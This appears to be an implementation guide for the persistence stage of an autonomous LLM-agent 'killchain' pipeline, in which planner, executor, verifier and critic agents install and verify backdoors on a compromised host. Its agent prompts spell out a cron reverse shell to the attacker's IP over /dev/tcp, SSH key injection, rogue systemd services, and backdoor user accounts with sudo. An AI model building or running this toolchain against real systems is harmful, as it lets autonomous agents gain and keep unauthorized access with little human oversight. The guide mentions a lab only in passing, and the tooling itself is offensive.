# Implementation Guide: Persistence Stage

> **Standalone prompt** — contains everything needed to implement `stages/persistence.py`.
> No other guide needs to be read.

---

## 1. Overview

The **Persistence** stage is the third stage in the killchain pipeline:

```
Recon → Initial Access → **Persistence** → PrivEsc → Impact
```

**Purpose**: After initial exploitation gives us a session on the target, this stage installs a mechanism that lets us regain access even if the current session dies or the machine reboots. It then **verifies** the mechanism actually works.

**Key differentiator**: This stage has a dedicated **Verifier** node that actively tests the installed persistence mechanism (e.g., tries SSH key login, checks cron is scheduled, confirms systemd service is active).

---

## 2. Input Contract

The orchestrator calls `run_persistence()` with data from prior stages. Read `core_agents/orchestrator.py` lines 158–171 for the current stub.

```python
def run_persistence(
    target_ip: str,
    session_id: str,
    session_type: str,       # "command_shell" | "meterpreter"
    access_level: str,       # "user" | "root" | "unknown"
    objective: str = "",
    thread_id: str = None,
    recursion_limit: int = 100,
) -> PersistenceFindings:
```

These values come from `PipelineState`:

| Field | Source |
|-------|--------|
| `target_ip` | `state["recon_findings"]["target_ip"]` or `state["target_ip"]` |
| `session_id` | `state["exploitation_findings"]["session_id"]` |
| `session_type` | `state["exploitation_findings"]["session_type"]` |
| `access_level` | `state["exploitation_findings"]["access_level"]` |
| `objective` | `state["objective"]` |

---

## 3. Output Contract

Return a `PersistenceFindings` TypedDict. Already defined in `core_agents/state.py`:

```python
class PersistenceFindings(TypedDict):
    success: bool
    method: str       # e.g. "cron_job", "ssh_key", "systemd_service", "user_account"
    details: str      # What was persisted and how
    summary: str
```

---

## 4. Reference Files — READ THESE FIRST

| File | What to learn |
|------|---------------|
| `stages/recon.py` | Simpler 3-node graph pattern (planner → executor → critic), ReAct loops, `build_graph()`, `run_recon()`, `main()` with `--graph`, `_extract_recon_findings()` |
| `stages/initial_access.py` | Complex multi-node pattern, multi-verdict critic, tool call counting, safety valves, `_extract_findings()`, success logger, `run_exploitation()` |
| `core_agents/state.py` | `PersistenceFindings` TypedDict, `PipelineState` |
| `core_agents/common.py` | `Colors`, `print_colored`, `call_llm`, `parse_json_response`, `run_ssh_command`, `tool_linux_terminal`, config constants (`KALI_IP`, `MODEL_NAME`, etc.) |
| `core_agents/orchestrator.py` | Stub at lines 158–171 to replace |
| `tools/rag.py` | `query_knowledge_base` signature |
| `tools/metasploit_tools.py` | `msf_session` object, `MetasploitSession.send_command()` |

---

## 5. Architecture — Graph Flow

```
Planner ⟷ planner_tools → Executor ⟷ executor_tools → Verifier ⟷ verifier_tools → Critic
                                                                                       ↓
                                                                                PASS → END
                                                                                FAIL → Planner (max 5)
```

### Nodes

| Node | LLM call? | Tools | Purpose |
|------|-----------|-------|---------|
| `planner` | Yes | `query_knowledge_base` (via `planner_tools`) | Choose persistence technique based on access level & target |
| `planner_tools` | No | `ToolNode(PLANNER_TOOLS)` | Execute RAG queries |
| `executor` | Yes | `tool_linux_terminal`, `tool_metasploit_rpc` (via `executor_tools`) | Install the persistence mechanism |
| `executor_tools` | No | `ToolNode(EXECUTOR_TOOLS)` | Execute SSH/MSF commands |
| `verifier` | Yes | `tool_linux_terminal` (via `verifier_tools`) | Test that the mechanism actually works |
| `verifier_tools` | No | `ToolNode(VERIFIER_TOOLS)` | Execute verification commands |
| `critic` | Yes | None | Evaluate: was persistence installed AND verified? |

### Edges

```
Entry → planner
planner → [planner_tools | executor]        # conditional: tool_calls → planner_tools, text → executor
planner_tools → planner                     # ReAct loop back
executor → [executor_tools | verifier]      # conditional: tool_calls → executor_tools, text → verifier
executor_tools → executor                   # ReAct loop back
verifier → [verifier_tools | critic]        # conditional: tool_calls → verifier_tools, text → critic
verifier_tools → verifier                   # ReAct loop back
critic → [planner | END]                    # conditional: FAIL → planner, PASS → END
```

---

## 6. Internal State TypedDict

```python
class PersistenceState(TypedDict):
    messages: Annotated[List[BaseMessage], operator.add]
    target_ip: str
    session_id: str
    session_type: str          # "command_shell" | "meterpreter"
    access_level: str          # "user" | "root"
    objective: str
    persistence_plan: str      # Planner's chosen technique + steps
    install_result: str        # Executor's summary of what was installed
    verification_result: str   # Verifier's summary of verification test
    loop_step: int
    critic_verdict: str        # "PASS" | "FAIL"
```

---

## 7. Constants

```python
MAX_PERSISTENCE_RETRIES = 5
MAX_PLANNER_TOOL_CALLS = 5
MAX_EXECUTOR_TOOL_CALLS = 10
MAX_VERIFIER_TOOL_CALLS = 5
```

---

## 8. Imports

```python
import sys
import json
import re
import time
import operator
from typing import TypedDict, Annotated, List, Literal

from langchain_core.messages import BaseMessage, HumanMessage, AIMessage, ToolMessage
from langchain_core.tools import tool
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langgraph.checkpoint.memory import MemorySaver

from core_agents.common import (
    Colors, print_colored, call_llm, parse_json_response,
    run_ssh_command, KALI_IP, MODEL_NAME, FORBIDDEN_COMMANDS,
)
from core_agents.state import PersistenceFindings
from tools.rag import query_knowledge_base
from tools.metasploit_tools import msf_session
```

---

## 9. Tool Definitions

Define stage-specific `@tool` wrappers locally (for stage-specific docstrings):

```python
@tool
def tool_linux_terminal(command: str):
    """
    Execute a shell command on the Kali machine via SSH.
    Use this to install persistence mechanisms on the target via the active session,
    or to run commands through a reverse shell.

    NON-INTERACTIVE ONLY. No ftp, ssh, vi, nano, top.
    Use non-interactive flags (e.g., -y).
    """
    if any(bad in command for bad in FORBIDDEN_COMMANDS):
        return "Command blocked by safety guardrails."
    print_colored(f"\n[Persistence Terminal] Executing: {command}", Colors.OKCYAN)
    return run_ssh_command(command)


@tool
def tool_metasploit_rpc(command: str):
    """
    Execute a command on the active Metasploit console.
    State is preserved across calls.

    Use this to interact with Meterpreter sessions for persistence:
    - 'sessions -i <id>' to interact with a session
    - Upload files, run post-exploitation modules
    - 'run persistence' or post/multi/manage modules
    """
    try:
        return msf_session.send_command(command)
    except Exception as e:
        return f"RPC Error: {str(e)}"


# Tool sets
PLANNER_TOOLS = [query_knowledge_base]
EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc]
VERIFIER_TOOLS = [tool_linux_terminal]
```

---

## 10. System Prompts

### PLANNER_PROMPT

```python
PLANNER_PROMPT = f"""You are a Persistence Planner for a Red Team agent. Your attacker IP is {KALI_IP}.

You receive:
1. TARGET IP, SESSION ID, SESSION TYPE, ACCESS LEVEL — details of the active session
2. OBJECTIVE — the operator's overall goal
3. CRITIC FEEDBACK — if retrying, what went wrong last time

Your job: choose ONE persistence technique and produce a step-by-step installation plan.

**You have access to `query_knowledge_base`** — a RAG tool that searches your internal knowledge base
of post-exploitation and persistence techniques.

**Before producing your plan, query the knowledge base** for relevant techniques:
- Search for persistence techniques suitable for the target OS and access level
- Use verbose queries (e.g., "Linux persistence techniques for user-level access using cron jobs and SSH keys")
- You may make up to {MAX_PLANNER_TOOL_CALLS} queries

**Technique selection (choose based on access level):**

If access_level == "root":
1. SSH authorized_keys injection (most reliable)
2. Cron job backdoor (reverse shell on schedule)
3. Systemd service (persistent daemon)
4. New user account with SSH access

If access_level == "user":
1. SSH authorized_keys injection (into user's ~/.ssh/)
2. User-level cron job
3. Bash profile backdoor (~/.bashrc, ~/.profile)
4. At job scheduling

**Output format (final answer — no more tool calls):**

PERSISTENCE PLAN:
TECHNIQUE: <method name, e.g., "ssh_key">
ACCESS_LEVEL: <current access level>
STEPS:
1. <exact command or action>
2. <exact command or action>
...

VERIFICATION_PLAN:
1. <how to verify the mechanism works>
2. <expected output that confirms success>

**On retry:**
- Read the critic's feedback carefully
- Choose a DIFFERENT technique from the list above
- Do NOT repeat a technique that already failed
"""
```

### EXECUTOR_PROMPT

```python
EXECUTOR_PROMPT = f"""You are a Persistence Executor for a Red Team agent. Your attacker IP is {KALI_IP}.

You have access to `tool_linux_terminal` (SSH to Kali) and `tool_metasploit_rpc` (MSF console).

**Your job:** Execute the persistence installation plan step by step.

**Rules:**
1. Execute commands ONE AT A TIME via tools
2. READ each output carefully before proceeding
3. If a command fails, adapt (e.g., create directories, fix permissions)
4. Do NOT run more than {MAX_EXECUTOR_TOOL_CALLS} commands total
5. When working through an active session (shell/meterpreter), use the appropriate tool:
   - For Meterpreter sessions: use `tool_metasploit_rpc` with 'sessions -i <id>' first
   - For command shells: pipe commands through the session or use tool_linux_terminal on Kali

**Common persistence commands (adapt to the plan):**

SSH Key Injection:
- Generate key: ssh-keygen -t rsa -f /tmp/persist_key -N ""
- Copy public key to target's authorized_keys via the session
- Ensure .ssh directory exists with correct permissions (700)
- Ensure authorized_keys has correct permissions (600)

Cron Job:
- echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{KALI_IP}/<PORT> 0>&1'" | crontab -
- Or write to /etc/cron.d/ if root

Systemd Service:
- Write a .service unit file to /etc/systemd/system/
- systemctl daemon-reload && systemctl enable <service>

User Account:
- useradd -m -s /bin/bash <user> && echo '<user>:<pass>' | chpasswd
- Add to sudoers if root access available

**When done, provide a text summary of what was installed and where.**
Do not make any more tool calls after providing your summary.
"""
```

### VERIFIER_PROMPT

```python
VERIFIER_PROMPT = f"""You are a Persistence Verifier for a Red Team agent. Your attacker IP is {KALI_IP}.

You have access to `tool_linux_terminal` to run verification commands on Kali.

**Your job:** Verify that the installed persistence mechanism actually works.

**Verification strategies by technique:**

SSH Key:
- Try: sshpass or ssh -i /tmp/persist_key -o StrictHostKeyChecking=no <user>@<target> "whoami"
- Expected: returns the username without password prompt

Cron Job:
- Check on target: crontab -l (via the session) to confirm the job is listed
- Or wait for the cron to fire and check for a new session on Kali
- Check: ls -la /var/spool/cron/ or /etc/cron.d/

Systemd Service:
- Check: systemctl status <service> — should show "active" or "enabled"
- Check: systemctl is-enabled <service>

User Account:
- Try: sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no <user>@<target> "whoami"
- Or check: grep <user> /etc/passwd (via session)

**Rules:**
1. Run verification commands ONE AT A TIME
2. Do NOT run more than {MAX_VERIFIER_TOOL_CALLS} commands
3. Provide a text summary with clear PASS/FAIL assessment

**Output (final text — no more tool calls):**

VERIFICATION RESULT:
METHOD: <technique verified>
STATUS: <WORKING | NOT WORKING>
EVIDENCE: <what output confirmed it>
"""
```

### CRITIC_PROMPT

```python
CRITIC_PROMPT = f"""You are a Persistence Critic for a Red Team operation. Your IP is {KALI_IP}.

You evaluate whether a persistence mechanism was successfully installed AND verified.

**You receive:**
- The persistence plan (technique chosen)
- The executor's installation summary
- The verifier's test results
- The loop step count

**Evaluation criteria:**

1. **Mechanism installed?** — Did the executor report successful installation?
2. **Mechanism verified?** — Did the verifier confirm the mechanism works?
   - SSH key: verified login works without password
   - Cron: verified job is listed and/or fires
   - Service: verified service is active/enabled
   - User: verified new user can log in
3. **Both required for PASS** — installation without verification is NOT a PASS

**Verdict:**
- **PASS** if: mechanism was installed AND verified working
- **FAIL** if: installation failed, OR verification failed or was not performed

**Output format:**

VERDICT: <PASS|FAIL>

METHOD: <technique that was attempted>

ASSESSMENT: <2-3 sentence summary>

FEEDBACK: <if FAIL — specific instructions for retry.
           Suggest a DIFFERENT technique if the current one keeps failing.
           Be specific: name the technique and key commands.>
"""
```

---

## 11. Node Implementations

### `planner_node`

Follow the same ReAct pattern as `recon.py:planner_node` (lines 329–404):

```python
def planner_node(state: PersistenceState) -> dict:
    """Choose persistence technique. ReAct loop with RAG."""
    print_colored("\n[Persistence Planner] Selecting technique...", Colors.HEADER)

    messages = state["messages"]
    target_ip = state.get("target_ip", "")
    session_id = state.get("session_id", "")
    session_type = state.get("session_type", "")
    access_level = state.get("access_level", "user")

    # Count planner tool calls in current cycle
    planner_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage):
            break
        if isinstance(msg, ToolMessage):
            planner_tool_count += 1

    if planner_tool_count == 0:
        # First call: build context
        context = (
            f"TARGET: {target_ip}\n"
            f"SESSION: {session_type} (ID: {session_id})\n"
            f"ACCESS LEVEL: {access_level}\n"
            f"OBJECTIVE: {state.get('objective', '')}\n"
        )
        # Include critic feedback if retrying
        for msg in reversed(messages):
            if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
                context += f"\nPREVIOUS FAILURE:\n{msg.content}\n"
                break
        planner_msgs = [HumanMessage(content=context)]
    else:
        # Continuing ReAct loop — include from last HumanMessage
        cycle_start = 0
        for i in range(len(messages) - 1, -1, -1):
            if isinstance(messages[i], HumanMessage):
                cycle_start = i
                break
        planner_msgs = list(messages[cycle_start:])

    # Safety valve
    if planner_tool_count >= MAX_PLANNER_TOOL_CALLS:
        print_colored(f"[Persistence Planner] RAG cap reached ({planner_tool_count}).", Colors.WARNING)
        response = call_llm(
            messages=planner_msgs + [HumanMessage(content=(
                "Max queries reached. Produce your final persistence plan now."
            ))],
            system_prompt=PLANNER_PROMPT
        )
    else:
        response = call_llm(
            messages=planner_msgs,
            system_prompt=PLANNER_PROMPT,
            tools=PLANNER_TOOLS
        )

    if response.content and not response.tool_calls:
        print_colored(f"[Persistence Planner] Plan:\n{response.content[:300]}", Colors.OKGREEN)
        return {
            "messages": [AIMessage(content=f"[Persistence Planner] {response.content}")],
            "persistence_plan": response.content,
        }

    return {"messages": [response]}
```

### `executor_node`

Follow `initial_access.py:executor_node` pattern (lines 782–823):

```python
def executor_node(state: PersistenceState) -> dict:
    """Install persistence mechanism. ReAct loop with SSH/MSF tools."""
    messages = state["messages"]
    print_colored("\n[Persistence Executor] Installing mechanism...", Colors.HEADER)

    # Count tool calls since planner output
    executor_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and "[Persistence Planner]" in (msg.content or ""):
            break
        if isinstance(msg, ToolMessage):
            executor_tool_count += 1

    # Build message window from planner output
    executor_msgs = []
    capturing = False
    for msg in messages:
        if isinstance(msg, AIMessage) and "[Persistence Planner]" in (msg.content or ""):
            capturing = True
        if capturing:
            executor_msgs.append(msg)
    if not executor_msgs:
        executor_msgs = [messages[-1]]

    # Safety valve
    if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS:
        print_colored(f"[Persistence Executor] Tool cap ({executor_tool_count}). Forcing summary.", Colors.WARNING)
        response = call_llm(
            messages=executor_msgs + [HumanMessage(content=(
                "Max tool calls reached. Summarize what was installed so far."
            ))],
            system_prompt=EXECUTOR_PROMPT
        )
    else:
        response = call_llm(
            messages=executor_msgs,
            system_prompt=EXECUTOR_PROMPT,
            tools=EXECUTOR_TOOLS
        )

    # Capture text summary into install_result
    if response.content and not response.tool_calls:
        return {
            "messages": [response],
            "install_result": response.content,
        }

    return {"messages": [response]}
```

### `verifier_node`

New node unique to this stage:

```python
def verifier_node(state: PersistenceState) -> dict:
    """Verify persistence mechanism works. ReAct loop with SSH."""
    messages = state["messages"]
    install_result = state.get("install_result", "")
    persistence_plan = state.get("persistence_plan", "")

    print_colored("\n[Persistence Verifier] Testing mechanism...", Colors.HEADER)

    # Count verifier tool calls
    verifier_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and not msg.tool_calls and msg.content:
            # Hit executor's summary = start of verifier cycle
            if "[Persistence Executor]" in msg.content or msg.content == install_result:
                break
        if isinstance(msg, ToolMessage):
            verifier_tool_count += 1

    # Build context for verifier
    if verifier_tool_count == 0:
        context = (
            f"PERSISTENCE PLAN:\n{persistence_plan}\n\n"
            f"INSTALLATION RESULT:\n{install_result}\n\n"
            f"TARGET: {state.get('target_ip', '')}\n"
            f"SESSION: {state.get('session_type', '')} (ID: {state.get('session_id', '')})\n"
            f"\nVerify the mechanism works by testing it now."
        )
        verifier_msgs = [HumanMessage(content=context)]
    else:
        # Continuing ReAct loop — use recent messages
        verifier_msgs = list(messages[-min(10, len(messages)):])

    # Safety valve
    if verifier_tool_count >= MAX_VERIFIER_TOOL_CALLS:
        print_colored(f"[Persistence Verifier] Tool cap ({verifier_tool_count}).", Colors.WARNING)
        response = call_llm(
            messages=verifier_msgs + [HumanMessage(content=(
                "Max verification commands reached. Provide your verification assessment now."
            ))],
            system_prompt=VERIFIER_PROMPT
        )
    else:
        response = call_llm(
            messages=verifier_msgs,
            system_prompt=VERIFIER_PROMPT,
            tools=VERIFIER_TOOLS
        )

    # Capture text summary
    if response.content and not response.tool_calls:
        return {
            "messages": [response],
            "verification_result": response.content,
        }

    return {"messages": [response]}
```

### `critic_node`

```python
def critic_node(state: PersistenceState) -> dict:
    """Evaluate installation + verification."""
    messages = state["messages"]
    current_step = state.get("loop_step", 0)

    print_colored("\n[Persistence Critic] Evaluating...", Colors.HEADER)

    persistence_plan = state.get("persistence_plan", "")
    install_result = state.get("install_result", "")
    verification_result = state.get("verification_result", "")

    evidence = (
        f"PERSISTENCE PLAN:\n{persistence_plan}\n\n"
        f"INSTALLATION RESULT:\n{install_result}\n\n"
        f"VERIFICATION RESULT:\n{verification_result}\n\n"
        f"LOOP STEP: {current_step} of {MAX_PERSISTENCE_RETRIES}\n"
    )

    response = call_llm(
        messages=[HumanMessage(content=evidence)],
        system_prompt=CRITIC_PROMPT
    )

    verdict_text = response.content.strip()
    print_colored(f"[Persistence Critic] {verdict_text[:300]}", Colors.OKCYAN)

    new_step = current_step + 1
    upper = verdict_text.upper()
    if "VERDICT: PASS" in upper or ("PASS" in upper and "FAIL" not in upper):
        verdict = "PASS"
    else:
        verdict = "FAIL"

    print_colored(f"[Persistence Critic] Verdict: {verdict}",
                  Colors.OKGREEN if verdict == "PASS" else Colors.FAIL)

    if verdict == "PASS":
        return {
            "messages": [AIMessage(content=f"[Persistence Critic] PASS — {verdict_text}")],
            "loop_step": new_step,
            "critic_verdict": "PASS",
        }
    else:
        return {
            "messages": [HumanMessage(content=f"CRITIC FEEDBACK: {verdict_text}")],
            "loop_step": new_step,
            "critic_verdict": "FAIL",
        }
```

### Tool Nodes

```python
def planner_tools_node(state: PersistenceState) -> dict:
    tool_node = ToolNode(PLANNER_TOOLS)
    return tool_node.invoke(state)

def executor_tools_node(state: PersistenceState) -> dict:
    tool_node = ToolNode(EXECUTOR_TOOLS)
    return tool_node.invoke(state)

def verifier_tools_node(state: PersistenceState) -> dict:
    tool_node = ToolNode(VERIFIER_TOOLS)
    return tool_node.invoke(state)
```

---

## 12. Routing Logic

```python
def route_after_planner(state: PersistenceState) -> Literal["planner_tools", "executor"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        count = sum(1 for m in reversed(state["messages"])
                    if isinstance(m, ToolMessage)
                    and not (isinstance(m, HumanMessage)))
        # Simplified: recount from cycle boundary
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, HumanMessage):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_PLANNER_TOOL_CALLS:
            return "executor"
        return "planner_tools"
    return "executor"


def route_after_executor(state: PersistenceState) -> Literal["executor_tools", "verifier"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, AIMessage) and "[Persistence Planner]" in (m.content or ""):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_EXECUTOR_TOOL_CALLS:
            return "verifier"
        return "executor_tools"
    return "verifier"


def route_after_verifier(state: PersistenceState) -> Literal["verifier_tools", "critic"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, AIMessage) and not m.tool_calls and m.content:
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_VERIFIER_TOOL_CALLS:
            return "critic"
        return "verifier_tools"
    return "critic"


def route_after_critic(state: PersistenceState) -> Literal["planner", "__end__"]:
    time.sleep(2)  # Rate limiting
    current_step = state.get("loop_step", 0)
    if current_step >= MAX_PERSISTENCE_RETRIES:
        print_colored("--- MAX PERSISTENCE RETRIES REACHED ---", Colors.FAIL)
        return END
    verdict = state.get("critic_verdict", "FAIL")
    if verdict == "PASS":
        return END
    return "planner"
```

---

## 13. Graph Construction — `build_graph()`

```python
def build_graph() -> StateGraph:
    workflow = StateGraph(PersistenceState)

    workflow.add_node("planner", planner_node)
    workflow.add_node("planner_tools", planner_tools_node)
    workflow.add_node("executor", executor_node)
    workflow.add_node("executor_tools", executor_tools_node)
    workflow.add_node("verifier", verifier_node)
    workflow.add_node("verifier_tools", verifier_tools_node)
    workflow.add_node("critic", critic_node)

    workflow.set_entry_point("planner")

    # Planner ReAct loop
    workflow.add_conditional_edges(
        "planner", route_after_planner,
        {"planner_tools": "planner_tools", "executor": "executor"}
    )
    workflow.add_edge("planner_tools", "planner")

    # Executor ReAct loop
    workflow.add_conditional_edges(
        "executor", route_after_executor,
        {"executor_tools": "executor_tools", "verifier": "verifier"}
    )
    workflow.add_edge("executor_tools", "executor")

    # Verifier ReAct loop
    workflow.add_conditional_edges(
        "verifier", route_after_verifier,
        {"verifier_tools": "verifier_tools", "critic": "critic"}
    )
    workflow.add_edge("verifier_tools", "verifier")

    # Critic routing
    workflow.add_conditional_edges(
        "critic", route_after_critic,
        {"planner": "planner", END: END}
    )

    return workflow
```

---

## 14. Findings Extraction — `_extract_persistence_findings()`

```python
def _extract_persistence_findings(state: dict) -> PersistenceFindings:
    critic_verdict = state.get("critic_verdict", "")
    persistence_plan = state.get("persistence_plan", "")
    install_result = state.get("install_result", "")
    verification_result = state.get("verification_result", "")

    success = critic_verdict == "PASS"

    # Extract method from plan text
    method = "unknown"
    plan_lower = persistence_plan.lower()
    if "ssh" in plan_lower and "key" in plan_lower:
        method = "ssh_key"
    elif "cron" in plan_lower:
        method = "cron_job"
    elif "systemd" in plan_lower or "service" in plan_lower:
        method = "systemd_service"
    elif "user" in plan_lower and ("account" in plan_lower or "useradd" in plan_lower):
        method = "user_account"
    elif "bashrc" in plan_lower or "profile" in plan_lower:
        method = "shell_profile"

    # Build details
    details = f"Plan: {persistence_plan[:200]}\nInstall: {install_result[:200]}\nVerify: {verification_result[:200]}"

    # Build summary
    if success:
        summary = f"Persistence established via {method}. Verified working."
    else:
        summary = f"Persistence failed. Attempted: {method}. {verification_result[:100]}"

    return PersistenceFindings(
        success=success,
        method=method,
        details=details,
        summary=summary,
    )
```

---

## 15. Entry Point — `run_persistence()`

Follow the pattern from `recon.py:run_recon()` (lines 765–873):

```python
def run_persistence(
    target_ip: str,
    session_id: str,
    session_type: str,
    access_level: str,
    objective: str = "",
    thread_id: str = None,
    recursion_limit: int = 100,
) -> PersistenceFindings:
    import uuid

    if thread_id is None:
        thread_id = f"persist_{uuid.uuid4().hex[:8]}"

    workflow = build_graph()
    checkpointer = MemorySaver()
    app = workflow.compile(checkpointer=checkpointer)

    config = {
        "configurable": {"thread_id": thread_id},
        "recursion_limit": recursion_limit,
    }

    initial_state = {
        "messages": [HumanMessage(content=(
            f"Install persistence on {target_ip}.\n"
            f"Session: {session_type} (ID: {session_id})\n"
            f"Access level: {access_level}\n"
            f"Objective: {objective}"
        ))],
        "target_ip": target_ip,
        "session_id": session_id,
        "session_type": session_type,
        "access_level": access_level,
        "objective": objective,
        "persistence_plan": "",
        "install_result": "",
        "verification_result": "",
        "loop_step": 0,
        "critic_verdict": "",
    }

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(f"[run_persistence] Starting persistence subgraph", Colors.HEADER)
    print_colored(f"  Target: {target_ip}", Colors.HEADER)
    print_colored(f"  Session: {session_type} #{session_id}", Colors.HEADER)
    print_colored(f"  Access: {access_level}", Colors.HEADER)
    print_colored(f"  Thread: {thread_id}", Colors.HEADER)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    for event in app.stream(initial_state, config=config):
        for key, value in event.items():
            if not value or "messages" not in value:
                continue
            msgs = value["messages"]
            if not isinstance(msgs, list):
                msgs = [msgs]
            for msg in msgs:
                if not isinstance(msg, BaseMessage) or not msg.content:
                    continue
                if "CRITIC FEEDBACK" in msg.content:
                    print_colored(f"\n{msg.content}", Colors.FAIL)
                elif isinstance(msg, ToolMessage):
                    display = msg.content[:500]
                    if len(msg.content) > 500:
                        display += "... [truncated]"
                    print(f"\n[Tool Output]: {display}")
                elif isinstance(msg, AIMessage):
                    content = msg.content
                    if "[Persistence Planner]" in content:
                        print_colored(f"\n{content[:400]}", Colors.OKBLUE)
                    elif "[Persistence Critic]" in content:
                        color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
                        print_colored(f"\n{content[:400]}", color)
                    elif "[Persistence Verifier]" in content or "[Persistence Executor]" in content:
                        print_colored(f"\n{content[:400]}", Colors.WARNING)
                    else:
                        print_colored(f"\nAgent: {content[:400]}", Colors.OKGREEN)

                if hasattr(msg, "tool_calls") and msg.tool_calls:
                    for t in msg.tool_calls:
                        print_colored(
                            f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
                            Colors.OKCYAN
                        )

    final_snapshot = app.get_state(config)
    final_state = final_snapshot.values

    findings = _extract_persistence_findings(final_state)

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(
        f"[run_persistence] Complete — success={findings['success']}",
        Colors.OKGREEN if findings["success"] else Colors.FAIL
    )
    print_colored(f"  {findings['summary']}", Colors.OKCYAN)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    return findings
```

---

## 16. Orchestrator Integration

Replace the stub in `core_agents/orchestrator.py` (lines 158–171).

**Add import** at the top of `orchestrator.py`:
```python
from stages.persistence import run_persistence
```

**Replace `persistence_stage_node`:**
```python
def persistence_stage_node(state: PipelineState) -> dict:
    """Run the persistence subgraph using exploitation findings."""
    print_colored("\n[Pipeline] Running Persistence stage...", Colors.HEADER)

    exploit = state.get("exploitation_findings", {})

    # Skip if no session was obtained
    if not exploit.get("success") or not exploit.get("session_id"):
        print_colored("[Pipeline] No active session — skipping persistence.", Colors.WARNING)
        findings = {
            "success": False,
            "method": "",
            "details": "Skipped: no active session from initial access.",
            "summary": "Persistence skipped — no session available.",
        }
        return {
            "persistence_findings": findings,
            "current_stage": "persistence",
            "messages": [AIMessage(content="[Persistence] Skipped — no active session.")],
        }

    findings = run_persistence(
        target_ip=exploit.get("target_ip", state["target_ip"]),
        session_id=exploit["session_id"],
        session_type=exploit["session_type"],
        access_level=exploit.get("access_level", "unknown"),
        objective=state["objective"],
    )

    return {
        "persistence_findings": dict(findings),
        "current_stage": "persistence",
        "messages": [AIMessage(content=f"[Persistence Complete] {findings['summary']}")],
    }
```

---

## 17. Standalone `main()`

```python
def main():
    if "--graph" in sys.argv:
        workflow = build_graph()
        app = workflow.compile()
        try:
            print(app.get_graph().draw_ascii())
        except Exception:
            graph = app.get_graph()
            print("Nodes:", [n for n in graph.nodes])
            print("Edges:", [(e.source, e.target) for e in graph.edges])
        return

    print_colored("--- Persistence Stage (Standalone) ---", Colors.OKGREEN)
    print_colored("Nodes: planner → executor → verifier → critic", Colors.OKCYAN)

    target_ip = input("\n[Target IP]: ").strip()
    session_id = input("[Session ID]: ").strip()
    session_type = input("[Session Type (command_shell/meterpreter)]: ").strip() or "command_shell"
    access_level = input("[Access Level (user/root)]: ").strip() or "user"

    findings = run_persistence(
        target_ip=target_ip,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
    )

    print("\n" + json.dumps(dict(findings), indent=2, default=str))


if __name__ == "__main__":
    main()
```

---

## 18. Module Docstring

```python
"""
Persistence Subgraph — Install and verify a persistence mechanism on a compromised target.

Third stage of the killchain: recon → initial_access → **persistence** → privesc → impact.
Produces structured PersistenceFindings for downstream consumption.

Architecture:
    Planner ⟷ RAG → Executor ⟷ SSH/MSF → Verifier ⟷ SSH → Critic
                                                                 ↓
                                                          PASS → END
                                                          FAIL → Planner (max 5)

Usage:
    python stages/persistence.py                    # Interactive standalone mode
    python stages/persistence.py --graph            # Print graph topology
    from stages.persistence import run_persistence  # Programmatic subgraph call
"""
```

---

## 19. Verification Steps

After implementation:

```bash
# 1. Import test
python -c "from stages.persistence import run_persistence"

# 2. Graph topology
python stages/persistence.py --graph

# 3. Standalone test (requires lab + active session)
python stages/persistence.py

# 4. Integration: update orchestrator stub, run full pipeline
python -m core_agents.orchestrator
```

---

## 20. File Structure Summary

```
stages/persistence.py
├── Module docstring
├── Imports (from core_agents.common, core_agents.state, tools.rag, tools.metasploit_tools)
├── Constants (MAX_PERSISTENCE_RETRIES, MAX_*_TOOL_CALLS)
├── PersistenceState TypedDict
├── Tool definitions (@tool wrappers)
├── Tool sets (PLANNER_TOOLS, EXECUTOR_TOOLS, VERIFIER_TOOLS)
├── System prompts (PLANNER_PROMPT, EXECUTOR_PROMPT, VERIFIER_PROMPT, CRITIC_PROMPT)
├── Node functions (planner_node, executor_node, verifier_node, critic_node)
├── Tool nodes (planner_tools_node, executor_tools_node, verifier_tools_node)
├── Routing functions (route_after_planner/executor/verifier/critic)
├── build_graph()
├── _extract_persistence_findings()
├── run_persistence()
└── main() + if __name__ == "__main__"
```
